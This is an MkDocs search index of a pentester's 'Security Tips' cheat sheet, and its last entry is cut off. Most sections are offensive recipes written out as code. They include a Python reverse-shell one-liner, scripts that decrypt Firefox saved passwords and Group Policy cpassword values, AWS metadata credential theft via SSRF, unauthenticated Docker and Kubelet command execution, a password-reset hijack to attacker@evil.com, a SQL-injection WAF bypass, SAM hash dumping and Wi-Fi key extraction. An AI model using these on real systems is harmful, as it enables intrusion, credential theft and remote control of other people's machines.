{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Security Tips A list of security tips. Commands mkdocs serve - start the live-reloading docs server mkdocs build - build the documentation site","title":"Home"},{"location":"#security-tips","text":"A list of security tips.","title":"Security Tips"},{"location":"#commands","text":"mkdocs serve - start the live-reloading docs server mkdocs build - build the documentation site","title":"Commands"},{"location":"API/","text":"API Password reset From: https://hackerone.com/reports/322985 The attacker was able to send a password reset link to an arbitrary email by sending an array of email addresses instead of a single email address. POST https://hq.breadcrumb.com/api/v1/password_reset HTTP/1.1 with body like {\"email_address\":[\"admin@breadcrumb.com\",\"attacker@evil.com\"]} JSON to XML to XXE When the API accept JSON type format payload, then you can try to send the same playload but as a XML file. You can download the Burp extension named \"Content Type Converter\". This extension helps you to modify the JSON request to XML, XML request to JSON and normal form request to JSON in order to play with request and responses. https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html PUT /api/search HTTP/1.1 Host: test.com ... Content-Type: application/json;charset=UTF-8 { \"message\": \"xxx\" } PUT /api/message HTTP/1.1 Host: test.com ... Content-Type: application/xml;charset=UTF-8 <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?> <message>xxx</message> If the request is accepted by the API, then you can try to attack with an XXE payload.","title":"API"},{"location":"API/#api","text":"","title":"API"},{"location":"API/#password-reset","text":"From: https://hackerone.com/reports/322985 The attacker was able to send a password reset link to an arbitrary email by sending an array of email addresses instead of a single email address. POST https://hq.breadcrumb.com/api/v1/password_reset HTTP/1.1 with body like {\"email_address\":[\"admin@breadcrumb.com\",\"attacker@evil.com\"]}","title":"Password reset"},{"location":"API/#json-to-xml-to-xxe","text":"When the API accept JSON type format payload, then you can try to send the same playload but as a XML file. You can download the Burp extension named \"Content Type Converter\". This extension helps you to modify the JSON request to XML, XML request to JSON and normal form request to JSON in order to play with request and responses. https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html PUT /api/search HTTP/1.1 Host: test.com ... Content-Type: application/json;charset=UTF-8 { \"message\": \"xxx\" } PUT /api/message HTTP/1.1 Host: test.com ... Content-Type: application/xml;charset=UTF-8 <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?> <message>xxx</message> If the request is accepted by the API, then you can try to attack with an XXE payload.","title":"JSON to XML to XXE"},{"location":"aws/","text":"AWS Check if domain is on a bucket $ dig +nocmd flaws.cloud any +multiline +noall +answer List a bucket $ aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2 Ressources http://flaws.cloud/ SSRF on AWS to get credentials On AWS there is a metadata server that can be accessed through the REST API located at: http://169.254.169.254 . Sending a GET requests to the following endpoint will dump a list of roles that are attaches to the current EC2 instance. http://169.254.169.254/latest/meta-data/iam/security-credentials/ http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>","title":"AWS"},{"location":"aws/#aws","text":"","title":"AWS"},{"location":"aws/#check-if-domain-is-on-a-bucket","text":"$ dig +nocmd flaws.cloud any +multiline +noall +answer","title":"Check if domain is on a bucket"},{"location":"aws/#list-a-bucket","text":"$ aws s3 ls s3://flaws.cloud/ --no-sign-request --region us-west-2","title":"List a bucket"},{"location":"aws/#ressources","text":"http://flaws.cloud/","title":"Ressources"},{"location":"aws/#ssrf-on-aws-to-get-credentials","text":"On AWS there is a metadata server that can be accessed through the REST API located at: http://169.254.169.254 . Sending a GET requests to the following endpoint will dump a list of roles that are attaches to the current EC2 instance. http://169.254.169.254/latest/meta-data/iam/security-credentials/ http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>","title":"SSRF on AWS to get credentials"},{"location":"configuration-review/","text":"Switch Switch Hirschmann Un switch Hirschmann est un \u00e9quipement r\u00e9seau industriel. Pour r\u00e9cup\u00e9rer sa configuration, il est possible d'utiliser le logiciel HiVision. Le fichier de configuration est un fichier texte au format XML contenant un noeud chiffr\u00e9e. Depuis l'interface il est possible de le d\u00e9chiffrer. Pare-feu Fortinet Il est possible de se connecter sur une interface Web. Pour r\u00e9cup\u00e9rer la configuration du pare-feu il convient de t\u00e9l\u00e9charger une sauvegarde de la configuration.","title":"Configuration Review"},{"location":"configuration-review/#switch","text":"","title":"Switch"},{"location":"configuration-review/#switch-hirschmann","text":"Un switch Hirschmann est un \u00e9quipement r\u00e9seau industriel. Pour r\u00e9cup\u00e9rer sa configuration, il est possible d'utiliser le logiciel HiVision. Le fichier de configuration est un fichier texte au format XML contenant un noeud chiffr\u00e9e. Depuis l'interface il est possible de le d\u00e9chiffrer.","title":"Switch Hirschmann"},{"location":"configuration-review/#pare-feu","text":"","title":"Pare-feu"},{"location":"configuration-review/#fortinet","text":"Il est possible de se connecter sur une interface Web. Pour r\u00e9cup\u00e9rer la configuration du pare-feu il convient de t\u00e9l\u00e9charger une sauvegarde de la configuration.","title":"Fortinet"},{"location":"docker/","text":"Docker API The docker API expose the port 2375 . This API can be used to interact with the docker engine which basically give ou the right to do anything you desire unauthenticated. To confirm that the host is running Docker you can make a GET requests to /version : http://<host>:<port>/version {\"Platform\": {\"Name\": \"\"}, \"Components\": [{\"Name\": \"Engine\", \"Version\": \"18.06.1-ce\", \"Details\": {\"ApiVersion\": \"1.38\", \"Arch\": \"amd64\", \"BuildTime\": \"2018-10-26T23:39:57.000000000+00:00\", \"Experimental\": \"false\", \"GitCommit\": \"e68fc7a/18.06.1-ce\", \"GoVersion\": \"go1.10.3\", \"KernelVersion\": \"4.14.47-64.38.amzn2.x86_64\", \"MinAPIVersion\": \"1.12\", \"Os\": \"linux\"}}], \"Version\": \"18.06.1-ce\", \"ApiVersion\": \"1.38\", \"MinAPIVersion\": \"1.12\", \"GitCommit\": \"e68fc7a/18.06.1-ce\", \"GoVersion\": \"go1.10.3\", \"Os\": \"linux\", \"Arch\": \"amd64\", \"KernelVersion\": \"4.14.47-64.38.amzn2.x86_64\", \"BuildTime\": \"2018-10-26T23:39:57.000000000+00:00\"} Then, using the CLI you can execute commands, for instance: $ docker -H <host>:<port> ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES be2dd8aa8222 ubuntu:14.04 \"bash\" 5 years ago Up 2 seconds silly_elion $ docker -H <host>:<port> exec -it <container_name> /bin/bash root@abc:/# whoami root","title":"Docker"},{"location":"docker/#docker","text":"","title":"Docker"},{"location":"docker/#api","text":"The docker API expose the port 2375 . This API can be used to interact with the docker engine which basically give ou the right to do anything you desire unauthenticated. To confirm that the host is running Docker you can make a GET requests to /version : http://<host>:<port>/version {\"Platform\": {\"Name\": \"\"}, \"Components\": [{\"Name\": \"Engine\", \"Version\": \"18.06.1-ce\", \"Details\": {\"ApiVersion\": \"1.38\", \"Arch\": \"amd64\", \"BuildTime\": \"2018-10-26T23:39:57.000000000+00:00\", \"Experimental\": \"false\", \"GitCommit\": \"e68fc7a/18.06.1-ce\", \"GoVersion\": \"go1.10.3\", \"KernelVersion\": \"4.14.47-64.38.amzn2.x86_64\", \"MinAPIVersion\": \"1.12\", \"Os\": \"linux\"}}], \"Version\": \"18.06.1-ce\", \"ApiVersion\": \"1.38\", \"MinAPIVersion\": \"1.12\", \"GitCommit\": \"e68fc7a/18.06.1-ce\", \"GoVersion\": \"go1.10.3\", \"Os\": \"linux\", \"Arch\": \"amd64\", \"KernelVersion\": \"4.14.47-64.38.amzn2.x86_64\", \"BuildTime\": \"2018-10-26T23:39:57.000000000+00:00\"} Then, using the CLI you can execute commands, for instance: $ docker -H <host>:<port> ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES be2dd8aa8222 ubuntu:14.04 \"bash\" 5 years ago Up 2 seconds silly_elion $ docker -H <host>:<port> exec -it <container_name> /bin/bash root@abc:/# whoami root","title":"API"},{"location":"firefox/","text":"Firefox Read password (old) import os from ctypes import Structure, CDLL from ctypes import c_uint, c_void_p, c_char_p, cast, byref, string_at, c_ubyte import json import base64 NSSNAME = 'nss3.dll' FIREFOX_PATH = r'C:\\Program Files\\Mozilla Firefox' os.environ['PATH'] = \";\".join([os.environ['PATH'], FIREFOX_PATH]) class SECItem(Structure): _fields_ = [('type', c_uint), ('data', c_void_p), ('len', c_uint)] class secuPWData(Structure): _fields_ = [('source', c_ubyte), ('data', c_char_p)] def get_nss_lib(): nsslib = os.path.join(FIREFOX_PATH, NSSNAME) return CDLL(nsslib) def open_logins_file(folder): with open(os.path.join(folder, 'logins.json')) as fd: d = fd.read() j = json.loads(d) return j def read_password(folder): data = open_logins_file(folder) nsslib = get_nss_lib() logins = data.get('logins', []) ret_init = nsslib.NSS_Init(folder) print \"[+] Init NSS: %s\" % ret_init keySlot = nsslib.PK11_GetInternalKeySlot() nsslib.PK11_CheckUserPassword(keySlot, '') nsslib.PK11_Authenticate(keySlot, True, 0) field = SECItem() dectext = SECItem() pwdata = secuPWData() pwdata.source = 0 #PW_NONE pwdata.data = 0 d = logins[0]['encryptedPassword'] print d field.data = cast(c_char_p(base64.b64decode(d)), c_void_p) field.len = len(base64.b64decode(d)) print nsslib.PK11SDR_Decrypt(byref(field), byref(dectext), byref(pwdata)) print string_at(dectext.data, dectext.len) nsslib.NSS_Shutdown() if __name__ == '__main__': d = r'C:\\Users\\xxx\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\xxx' read_password(d)","title":"Firefox"},{"location":"firefox/#firefox","text":"","title":"Firefox"},{"location":"firefox/#read-password-old","text":"import os from ctypes import Structure, CDLL from ctypes import c_uint, c_void_p, c_char_p, cast, byref, string_at, c_ubyte import json import base64 NSSNAME = 'nss3.dll' FIREFOX_PATH = r'C:\\Program Files\\Mozilla Firefox' os.environ['PATH'] = \";\".join([os.environ['PATH'], FIREFOX_PATH]) class SECItem(Structure): _fields_ = [('type', c_uint), ('data', c_void_p), ('len', c_uint)] class secuPWData(Structure): _fields_ = [('source', c_ubyte), ('data', c_char_p)] def get_nss_lib(): nsslib = os.path.join(FIREFOX_PATH, NSSNAME) return CDLL(nsslib) def open_logins_file(folder): with open(os.path.join(folder, 'logins.json')) as fd: d = fd.read() j = json.loads(d) return j def read_password(folder): data = open_logins_file(folder) nsslib = get_nss_lib() logins = data.get('logins', []) ret_init = nsslib.NSS_Init(folder) print \"[+] Init NSS: %s\" % ret_init keySlot = nsslib.PK11_GetInternalKeySlot() nsslib.PK11_CheckUserPassword(keySlot, '') nsslib.PK11_Authenticate(keySlot, True, 0) field = SECItem() dectext = SECItem() pwdata = secuPWData() pwdata.source = 0 #PW_NONE pwdata.data = 0 d = logins[0]['encryptedPassword'] print d field.data = cast(c_char_p(base64.b64decode(d)), c_void_p) field.len = len(base64.b64decode(d)) print nsslib.PK11SDR_Decrypt(byref(field), byref(dectext), byref(pwdata)) print string_at(dectext.data, dectext.len) nsslib.NSS_Shutdown() if __name__ == '__main__': d = r'C:\\Users\\xxx\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\xxx' read_password(d)","title":"Read password (old)"},{"location":"git/","text":"Git Some website exposes .git to the internet. To check if the website is vulnerable, then check for the following path: https://<domain>/some/path/.git/HEAD If the server return a status 200, then it might be possible to clone the repository. For that, you can use ( GitTools )[https://github.com/internetwache/GitTools): Dumper/gitdumper.sh http://<domain>/some/path/.git/ ~/<domain> Extractor/extractor.sh ~/<domain> ~/<domain>_dump If the script is not dumping the .git folder, then you can modify it. Sometimes, the /.git/ path is a Directory Listing, then it's easier to dump using wget .","title":"Git"},{"location":"git/#git","text":"Some website exposes .git to the internet. To check if the website is vulnerable, then check for the following path: https://<domain>/some/path/.git/HEAD If the server return a status 200, then it might be possible to clone the repository. For that, you can use ( GitTools )[https://github.com/internetwache/GitTools): Dumper/gitdumper.sh http://<domain>/some/path/.git/ ~/<domain> Extractor/extractor.sh ~/<domain> ~/<domain>_dump If the script is not dumping the .git folder, then you can modify it. Sometimes, the /.git/ path is a Directory Listing, then it's easier to dump using wget .","title":"Git"},{"location":"graphql/","text":"GraphQL Request usefull informations Introspection is explained here . First we need to collect all available types then recursively enumerate all individual types. Querying All Available Types in a Schema query allSchemaTypes { __schema { types { name kind description } } } All Available Queries query availableQueries { __schema { queryType { fields { name description } } } } Details about an Individual Type query liftType { __type(name: \"<TYPE>\") { fields { name description } } }","title":"GraphQL"},{"location":"graphql/#graphql","text":"","title":"GraphQL"},{"location":"graphql/#request-usefull-informations","text":"Introspection is explained here . First we need to collect all available types then recursively enumerate all individual types.","title":"Request usefull informations"},{"location":"graphql/#querying-all-available-types-in-a-schema","text":"query allSchemaTypes { __schema { types { name kind description } } }","title":"Querying All Available Types in a Schema"},{"location":"graphql/#all-available-queries","text":"query availableQueries { __schema { queryType { fields { name description } } } }","title":"All Available Queries"},{"location":"graphql/#details-about-an-individual-type","text":"query liftType { __type(name: \"<TYPE>\") { fields { name description } } }","title":"Details about an Individual Type"},{"location":"iscsi/","text":"ISCSI # ISCSI_TARGET_PORTAL=172.17.247.210 # sudo iscsiadm -m discovery -t st -p \"${ISCSI_TARGET_PORTAL}\" # ISCSI_TARGET_NAME=iqn.1992-04.com.emc:cx.ckm00142002019.b4 # sudo iscsiadm --mode node --targetname \"${ISCSI_TARGET_NAME}\" -p \"${ISCSI_TARGET_PORTAL}\" -l # dmesg | grep sd","title":"ISCSI"},{"location":"iscsi/#iscsi","text":"# ISCSI_TARGET_PORTAL=172.17.247.210 # sudo iscsiadm -m discovery -t st -p \"${ISCSI_TARGET_PORTAL}\" # ISCSI_TARGET_NAME=iqn.1992-04.com.emc:cx.ckm00142002019.b4 # sudo iscsiadm --mode node --targetname \"${ISCSI_TARGET_NAME}\" -p \"${ISCSI_TARGET_PORTAL}\" -l # dmesg | grep sd","title":"ISCSI"},{"location":"kubernetes/","text":"Kubernetes API The Kubernetes API exposes the port 10250 . This API can be used to interact with the Kubernetes engine which basically give ou the right to do anything you desire unauthenticated. To confirm that the host is running Docker you can make a GET requests to /pods : https://<host>:<port>/pods {\"kind\":\"PodList\",\"apiVersion\":\"v1\",\"metadata\":{},\"items\":[{\"metadata\":{\"name\":\"dind-sgz8n\",\"generateName\":\"dind-\",\"namespace\":\"default\",\"selfLink\":\"/api/v1/namespaces/default/pods/dind-sgz8n\",`...}],\"qosClass\":\"BestEffort\"}}]} With the above information it's possible to send requests to the API to execute commands: $ curl --insecure -v -H \"W-Stream-Protocol-Version: v2.channel.k8s.io\" -H \"X-Stream-Protocol-Version: channel.k8s.io\" -H \"Connection: upgrade\" -H \"Upgrade: SPDY/3.1\" -X POST \"https://<host>:<port>/exec/<namespace>/<pod_name>/<container_name>?command=<cmd>&input=1&output=1&tty=1\" In the response, there is a Location header to create a WebSocket connection: $ wscat -c \"https://<host>:<port>/<location_header>\" --no-check Lancer un pod qui se supprime automatiquement \u00e0 la fin $ kubectl run k8s-2-test -ti --rm --image=debian --generator=run-pod/v1 S'attacher \u00e0 un pod existant $ kubectl exec -it k8s-2-test -- /bin/bash Se connecter \u00e0 une session existante $ kubectl attach k8s-1-test -c k8s-1-test -i -t Copier un fichier d'un pod \u00e0 sa machine $ kubectl cp default/k8s-1-test:results.nmap ./result_nmaps_banner Afficher les services (format simple \u00e0 traiter) $ kubectl get services (-o wide) Afficher les pods (json) $ kubectl get pods -o json Afficher les pods (format simple \u00e0 traiter) $ kubectl get pods -o wide ## Get IP list $ kubectl get pods -o wide | sed -e 's/\\s\\+/ /g' | cut -f6 -d \" \" Afficher l'ensemble des secrets $ kubectl get secrets -o yaml","title":"Kubernetes"},{"location":"kubernetes/#kubernetes","text":"","title":"Kubernetes"},{"location":"kubernetes/#api","text":"The Kubernetes API exposes the port 10250 . This API can be used to interact with the Kubernetes engine which basically give ou the right to do anything you desire unauthenticated. To confirm that the host is running Docker you can make a GET requests to /pods : https://<host>:<port>/pods {\"kind\":\"PodList\",\"apiVersion\":\"v1\",\"metadata\":{},\"items\":[{\"metadata\":{\"name\":\"dind-sgz8n\",\"generateName\":\"dind-\",\"namespace\":\"default\",\"selfLink\":\"/api/v1/namespaces/default/pods/dind-sgz8n\",`...}],\"qosClass\":\"BestEffort\"}}]} With the above information it's possible to send requests to the API to execute commands: $ curl --insecure -v -H \"W-Stream-Protocol-Version: v2.channel.k8s.io\" -H \"X-Stream-Protocol-Version: channel.k8s.io\" -H \"Connection: upgrade\" -H \"Upgrade: SPDY/3.1\" -X POST \"https://<host>:<port>/exec/<namespace>/<pod_name>/<container_name>?command=<cmd>&input=1&output=1&tty=1\" In the response, there is a Location header to create a WebSocket connection: $ wscat -c \"https://<host>:<port>/<location_header>\" --no-check","title":"API"},{"location":"kubernetes/#lancer-un-pod-qui-se-supprime-automatiquement-a-la-fin","text":"$ kubectl run k8s-2-test -ti --rm --image=debian --generator=run-pod/v1","title":"Lancer un pod qui se supprime automatiquement \u00e0 la fin"},{"location":"kubernetes/#sattacher-a-un-pod-existant","text":"$ kubectl exec -it k8s-2-test -- /bin/bash","title":"S'attacher \u00e0 un pod existant"},{"location":"kubernetes/#se-connecter-a-une-session-existante","text":"$ kubectl attach k8s-1-test -c k8s-1-test -i -t","title":"Se connecter \u00e0 une session existante"},{"location":"kubernetes/#copier-un-fichier-dun-pod-a-sa-machine","text":"$ kubectl cp default/k8s-1-test:results.nmap ./result_nmaps_banner","title":"Copier un fichier d'un pod \u00e0 sa machine"},{"location":"kubernetes/#afficher-les-services-format-simple-a-traiter","text":"$ kubectl get services (-o wide)","title":"Afficher les services (format simple \u00e0 traiter)"},{"location":"kubernetes/#afficher-les-pods-json","text":"$ kubectl get pods -o json","title":"Afficher les pods (json)"},{"location":"kubernetes/#afficher-les-pods-format-simple-a-traiter","text":"$ kubectl get pods -o wide ## Get IP list $ kubectl get pods -o wide | sed -e 's/\\s\\+/ /g' | cut -f6 -d \" \"","title":"Afficher les pods (format simple \u00e0 traiter)"},{"location":"kubernetes/#afficher-lensemble-des-secrets","text":"$ kubectl get secrets -o yaml","title":"Afficher l'ensemble des secrets"},{"location":"linux/","text":"Linux Wildcard $ ls -al /*a*/www/*l/*la*/*la*.* # /var/www/html/flag/flag.php $ ls -al $ ls * -rw-rw-r-- 1 root root 0 jun 28 21:38 -al","title":"Linux"},{"location":"linux/#linux","text":"","title":"Linux"},{"location":"linux/#wildcard","text":"$ ls -al /*a*/www/*l/*la*/*la*.* # /var/www/html/flag/flag.php $ ls -al $ ls * -rw-rw-r-- 1 root root 0 jun 28 21:38 -al","title":"Wildcard"},{"location":"nginx/","text":"Nginx Configuration file Here is a miss-configuration in the the nginx.conf file: # static files location /static { alias /srv/app/static/; } The location value does not end with a / but the alias value does. Which means that if we query: https://example.com/static../foo then the location will match and will concatenate ../foo to the alias, which gives us this local file access: /srv/app/static/../foo RCE in php-fpm (CVE-2019-11043) If a webserver runs nginx + php-fpm and nginx have a configuration like location ~ [^/]\\.php(/|$) { ... fastcgi_split_path_info ^(.+?\\.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; ... } More informations on https://github.com/neex/phuip-fpizdam .","title":"Nginx"},{"location":"nginx/#nginx","text":"","title":"Nginx"},{"location":"nginx/#configuration-file","text":"Here is a miss-configuration in the the nginx.conf file: # static files location /static { alias /srv/app/static/; } The location value does not end with a / but the alias value does. Which means that if we query: https://example.com/static../foo then the location will match and will concatenate ../foo to the alias, which gives us this local file access: /srv/app/static/../foo","title":"Configuration file"},{"location":"nginx/#rce-in-php-fpm-cve-2019-11043","text":"If a webserver runs nginx + php-fpm and nginx have a configuration like location ~ [^/]\\.php(/|$) { ... fastcgi_split_path_info ^(.+?\\.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; ... } More informations on https://github.com/neex/phuip-fpizdam .","title":"RCE in php-fpm (CVE-2019-11043)"},{"location":"oauth/","text":"OAuth CSRF: use state parameter Open redirection Short-lived and one-time use authorization codes Bearer token in the URI paramters Attack with pre-approved Client PKCE: Proof Key for Code Exchange (https://oauth.net/2/pkce/)","title":"OAuth"},{"location":"oauth/#oauth","text":"CSRF: use state parameter Open redirection Short-lived and one-time use authorization codes Bearer token in the URI paramters Attack with pre-approved Client PKCE: Proof Key for Code Exchange (https://oauth.net/2/pkce/)","title":"OAuth"},{"location":"path-traversal/","text":"Path Traversal Fake current working directory This is a symbolic link to the current working directory of the process: file:///proc/self/cwd/","title":"Path Traversal"},{"location":"path-traversal/#path-traversal","text":"","title":"Path Traversal"},{"location":"path-traversal/#fake-current-working-directory","text":"This is a symbolic link to the current working directory of the process: file:///proc/self/cwd/","title":"Fake current working directory"},{"location":"reverse-shell/","text":"Reverse-Shell A list of reverse-shell Python python -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\\"{IP}\\\\\",{Port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\\\"/bin/sh\\\\\",\\\\\"-i\\\\\"]);\\'","title":"Reverse Shell"},{"location":"reverse-shell/#reverse-shell","text":"A list of reverse-shell","title":"Reverse-Shell"},{"location":"reverse-shell/#python","text":"python -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\\"{IP}\\\\\",{Port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\\\"/bin/sh\\\\\",\\\\\"-i\\\\\"]);\\'","title":"Python"},{"location":"ssl/","text":"SSL Configuration https://ssl-config.mozilla.org/","title":"Ssl"},{"location":"ssl/#ssl-configuration","text":"https://ssl-config.mozilla.org/","title":"SSL Configuration"},{"location":"waf/","text":"WAF Bypass WEF in PHP From: https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/ /news.php?%20news[id%00=42\"+AND+1=0-- /news.php?news_id=42","title":"WAF"},{"location":"waf/#waf","text":"","title":"WAF"},{"location":"waf/#bypass-wef-in-php","text":"From: https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/ /news.php?%20news[id%00=42\"+AND+1=0-- /news.php?news_id=42","title":"Bypass WEF in PHP"},{"location":"windows/","text":"Windows KerberosUnConstrainedDelegation More information here $ Import-Module ActiveDirectory $ Get-ADComputer -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties 'TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,Description' # UserAccountControl & 0x80000 (TRUSTED_FOR_DELEGATION) # UserAccountControl & 0x100000 (TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) $ $computers = (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=Computer)(primaryGroupID=515)(useraccountcontrol:1.2.840.113556.1.4.804:=524288))\")).FindAll().Properties $ foreach($c in $computers) { echo \"$($c.name) ($($c.useraccountcontrol))\" } Collect AD users information # Helping functions function Get-ADUserDirectoryEntry($user) { return (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=User)(samAccountName=$user))\")).FindOne().GetDirectoryEntry() } function Get-ADUserGroups($user) { $userDirectoryEntry = Get-ADUserDirectoryEntry($user) $groups = $userDirectoryEntry.memberOf return $groups } function Get-ADGroupMembers($GroupName) { if ($GroupName -like \"CN=*\") { $GroupDistinguishedName = $GroupName } else { # find the distinguished name from the group name $GroupDistinguishedName = (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=Group)(cn=$GroupName))\")).FindOne().GetDirectoryEntry().distinguishedName } # limited to the first 10k entries $GroupMembers = (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=User)(memberOf=$GroupDistinguishedName ))\")).FindAll() return $GroupMembers.properties } # Get \"Domain admins\" users, be carefull the name may change depending on the DC lang $DomainAdmins = Get-ADGroupMembers(\"Domain Admins\") foreach($user in $DomainAdmins) { echo \"$($user.displayname) ($($user.samaccountname))\" } # (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=Computer)(cn=SCU44625))\")).FindAll() LDAP Query structure The website LdapWiki explains how to write a LDAP query. For instance, if we want to use bitwise in ldap queries, we need to use some splecial arguments. There are two Bitwise operation Extensible Match Rules. 1.2.840.113556.1.4.803 which is also referred to as LDAP_MATCHING_RULE_BIT_AND (Bitwise AND) 1.2.840.113556.1.4.804 which is also referred to as LDAP_MATCHING_RULE_BIT_OR (Bitwise OR) Decrypt GPO with cpassword #!/usr/bin/python import sys import binascii from Crypto.Cipher import AES from base64 import b64decode unpad = lambda s: s[:-1 * ord(s[-1])] def decrypt(cpassword): # Init the key # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2 key = binascii.unhexlify(\"4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b\") # Add padding to the base64 string and decode it cpassword += \"=\" * ((4 - len(cpassword) % 4) % 4) password = b64decode(cpassword) o = AES.new(key, AES.MODE_CBC, \"\\x00\" * 16).decrypt(password) return unpad(o).decode(\"utf16\") def main(): if len(sys.argv) != 2: print(\"Usage: gpprefdecrypt.py <cpassword>\") sys.exit(0) cpassword = sys.argv[1] o = decrypt(cpassword) print o if __name__ == \"__main__\": main() Use Win32 API in Python Download then install the pip package pywin32 here: https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32 Get NTP configuration server $ w32tm /query /status Windows 10 versions Release Informations SAM and SYSTEM backup reg save HKLM\\SYSTEM SystemBkup.hiv reg save HKLM\\SAM SamBkup.hiv Then with mimikatz you can recover the hashes: > lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv List Email aliases $ (Get-ADUser -Identity <user_ad_id> -Properties proxyAddresses).proxyAddresses Truster Account The PDF from SSTIC 2014 describes trusts accounts on Windows: sAMAccountType: 805306370 = ( TRUST_ACCOUNT ); Compile .Net without Visual Studio > cd \\Windows\\Microsoft.NET\\Framework\\v4* > msbuild \"path\\to\\SharpUp-master\\SharpUp.sln\" /t:Rebuild /p:Configuration=Release /p:Platform=\"Any CPU\" Or to compile a single file: > cd \\Windows\\Microsoft.NET\\Framework\\v4.0.30319 > csc.exe /t:exe /out:path\\to\\main.exe path\\to\\main.cs using System; public class HelloWorld { public static void Main() { Console.WriteLine(\"Hello world!\"); } } List Wifi networks and password > netsh wlan show profile > netsh wlan show profile <WiFi name> key=clear","title":"Windows"},{"location":"windows/#windows","text":"","title":"Windows"},{"location":"windows/#kerberosunconstraineddelegation","text":"More information here $ Import-Module ActiveDirectory $ Get-ADComputer -Filter {(TrustedForDelegation -eq $True) -AND (PrimaryGroupID -eq 515)} -Properties 'TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,Description' # UserAccountControl & 0x80000 (TRUSTED_FOR_DELEGATION) # UserAccountControl & 0x100000 (TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) $ $computers = (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=Computer)(primaryGroupID=515)(useraccountcontrol:1.2.840.113556.1.4.804:=524288))\")).FindAll().Properties $ foreach($c in $computers) { echo \"$($c.name) ($($c.useraccountcontrol))\" }","title":"KerberosUnConstrainedDelegation"},{"location":"windows/#collect-ad-users-information","text":"# Helping functions function Get-ADUserDirectoryEntry($user) { return (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=User)(samAccountName=$user))\")).FindOne().GetDirectoryEntry() } function Get-ADUserGroups($user) { $userDirectoryEntry = Get-ADUserDirectoryEntry($user) $groups = $userDirectoryEntry.memberOf return $groups } function Get-ADGroupMembers($GroupName) { if ($GroupName -like \"CN=*\") { $GroupDistinguishedName = $GroupName } else { # find the distinguished name from the group name $GroupDistinguishedName = (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=Group)(cn=$GroupName))\")).FindOne().GetDirectoryEntry().distinguishedName } # limited to the first 10k entries $GroupMembers = (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=User)(memberOf=$GroupDistinguishedName ))\")).FindAll() return $GroupMembers.properties } # Get \"Domain admins\" users, be carefull the name may change depending on the DC lang $DomainAdmins = Get-ADGroupMembers(\"Domain Admins\") foreach($user in $DomainAdmins) { echo \"$($user.displayname) ($($user.samaccountname))\" } # (New-Object System.DirectoryServices.DirectorySearcher(\"(&(objectCategory=Computer)(cn=SCU44625))\")).FindAll()","title":"Collect AD users information"},{"location":"windows/#ldap-query-structure","text":"The website LdapWiki explains how to write a LDAP query. For instance, if we want to use bitwise in ldap queries, we need to use some splecial arguments. There are two Bitwise operation Extensible Match Rules. 1.2.840.113556.1.4.803 which is also referred to as LDAP_MATCHING_RULE_BIT_AND (Bitwise AND) 1.2.840.113556.1.4.804 which is also referred to as LDAP_MATCHING_RULE_BIT_OR (Bitwise OR)","title":"LDAP Query structure"},{"location":"windows/#decrypt-gpo-with-cpassword","text":"#!/usr/bin/python import sys import binascii from Crypto.Cipher import AES from base64 import b64decode unpad = lambda s: s[:-1 * ord(s[-1])] def decrypt(cpassword): # Init the key # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2 key = binascii.unhexlify(\"4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b\") # Add padding to the base64 string and decode it cpassword += \"=\" * ((4 - len(cpassword) % 4) % 4) password = b64decode(cpassword) o = AES.new(key, AES.MODE_CBC, \"\\x00\" * 16).decrypt(password) return unpad(o).decode(\"utf16\") def main(): if len(sys.argv) != 2: print(\"Usage: gpprefdecrypt.py <cpassword>\") sys.exit(0) cpassword = sys.argv[1] o = decrypt(cpassword) print o if __name__ == \"__main__\": main()","title":"Decrypt GPO with cpassword"},{"location":"windows/#use-win32-api-in-python","text":"Download then install the pip package pywin32 here: https://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32","title":"Use Win32 API 